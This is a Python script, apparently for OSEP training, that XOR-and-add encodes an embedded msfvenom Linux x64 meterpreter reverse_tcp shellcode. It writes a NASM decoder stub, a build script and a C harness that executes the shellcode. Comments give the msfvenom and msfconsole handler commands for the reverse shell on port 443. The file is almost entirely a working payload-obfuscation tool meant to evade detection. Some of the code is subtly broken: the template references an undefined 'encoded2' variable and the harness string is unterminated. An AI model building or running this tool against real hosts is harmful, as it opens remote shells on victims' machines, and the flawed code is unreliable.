# created for OSEP challenges
# Techniques and code heavily drawn from SLAE, deff check that course out if you haven't already :)
# Author: Kymb0

import sys
import random
import os
import string
key = ord(''.join(random.choice(string.ascii_letters + string.digits)))
xor = ord(''.join(random.choice(string.ascii_letters + string.digits)))
key2 = ''.join('0x{:02x}'.format(key))
xor2 = ''.join('0x{:02x}'.format(xor))

# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=443 -f python
# sudo msfconsole -x "use exploits/multi/handler; set lhost 192.168.x.x; set lport 443; set payload linux/x64/meterpreter/reverse_tcp; exploit -j"

buf =  b""
buf += b"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
buf += b"\x31\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0"
buf += b"\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02"
buf += b"\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97"
buf += b"\x48\xb9\x02\x00\x01\xbb\xc0\xa8\x31\xd5\x51\x48\x89"
buf += b"\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0"
buf += b"\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00"
buf += b"\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f"
buf += b"\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05"
buf += b"\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6"
                                                              
encoded = ""

for x in (buf) :
	y = x^xor

	encoded += '0x%02x,' % (y-key & 0xff)
encoded += '0x%02x' % key


nasm_file= f'''
global _start
section .text
_start:
    jmp meat
decoder:
    pop rdi
    xor rcx, rcx
decode:

    add byte [rdi], {key2}
    xor byte [rdi], {xor2}
    inc rdi
    cmp byte [rdi], {key2}
    je potatoes
    loop decode
meat:
    call decoder
    potatoes: db {encoded2}

'''
nasm_compiler = '''
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf64 -o decode_stub.o decode_stub.nasm

echo '[+] Linking ...'
ld -o decode_stub decode_stub.o

echo '[+] Done!'


'''
open("compile.sh", "w").write(nasm_compiler)
open("decode_stub.nasm", "w").write(nasm_file)
print("[*] decode_stub.nasm written to current directory")
print("[*] compile.sh written to current directory")
print("[*] harness.c written to current directory")
print("""[*] run the below after compile.sh to extract shellcode with stub:\nfor i in $(objdump -D decode_stub | grep "^ "|cut -f2); do echo -n '\\\\x'$i; done; echo""")
print("[*] paste the output into harness.c and compile with:\ngcc -fno-stack-protector -z execstack -o runner harness.c")
harness = '''
#include<stdio.h>
#include<stdlib.h>
#include<string.h>



int main(int argc, char* argv[])
{
const char code[] = "PUT_EXTRACTED_SHELLCODE_FROM_COMPILED_NASM_HERE!!!;

        int (*s)() = (int(*)()) code;
        s();
        return 0;
}
'''
open("harness.c", "w").write(harness)
